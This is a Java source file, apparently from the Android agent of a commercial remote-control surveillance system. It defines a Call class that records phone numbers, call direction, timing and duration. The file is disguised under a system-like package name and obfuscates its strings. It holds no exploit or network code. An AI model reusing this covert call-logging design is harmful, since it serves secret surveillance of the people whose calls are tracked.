/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Call.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/
//
package com.android.deviceinfo;

import java.util.Date;

import com.android.m.M;

import com.android.deviceinfo.util.DateTime;

public class Call {
	private static final String TAG = "Call"; //$NON-NLS-1$

	private final String number;
	private boolean incoming, ongoing;
	private boolean complete;
	private final Date timeBegin;
	private Date timeEnd;

	private boolean offhook;

	private String newState;
	private String oldState;


	public final static boolean INCOMING = true;
	public final static boolean OUTGOING = false;
	public final static boolean START = true;
	public final static boolean END = false;

	public Call(String number, boolean incoming) {
		this.number = number;
		this.incoming = incoming;
		this.ongoing = false;
		this.timeBegin = new Date();
		this.complete = false;
	}

	public String getNumber() {
		return number;
	}
	
	public String getFrom() {
		if (incoming) {
			return getNumber();			
		} else {
			return Device.self().getPhoneNumber();
		}
	}
	
	public String getTo() {
		if (!incoming) {
			return getNumber();			
		} else {
			return Device.self().getPhoneNumber();
		}
	}

	public boolean isIncoming() {
		return incoming;
	}

	public boolean isOngoing() {
		return ongoing;
	}

	public Date getTimeBegin() {
		return timeBegin;
	}

	public Date getTimeEnd() {
		return timeEnd;
	}

	public boolean isComplete() {
		return complete;
	}

	public void setComplete(boolean answered) {
		this.complete = true;
		this.offhook = answered;
		if (answered) {
			timeEnd = new Date();
		}
	}

	public void setOngoing(boolean ongoing) {
		this.ongoing = ongoing;
	}

	/**
	 * Get the call duration in seconds elapsed between lastCall (older) and
	 * this call,
	 * 
	 * @param callInAction
	 * @return
	 */
	public int getDuration() {
		if (timeEnd == null) {
			return 0;
		}
		// lastCall =
		final long duration = timeEnd.getTime() - timeBegin.getTime();
		return (int) (duration / 1000);
	}

	@Override
	public String toString() {

		return String.format(
				M.e("%s ongoing: %s completed: %s incoming: %s begin: %s end: %s"), number, ongoing, complete, incoming, timeBegin, timeEnd);

	}

	public boolean isOffhook() {
		return offhook;
	}

	public void setOffhook() {
		offhook = true;
	}

	public boolean changedState() {
		newState = String.format(M.e("%s %s %s %s"), number, ongoing, complete, incoming);
		boolean changedState = !newState.equals(oldState);
		oldState = newState;
		return changedState;
	}
}
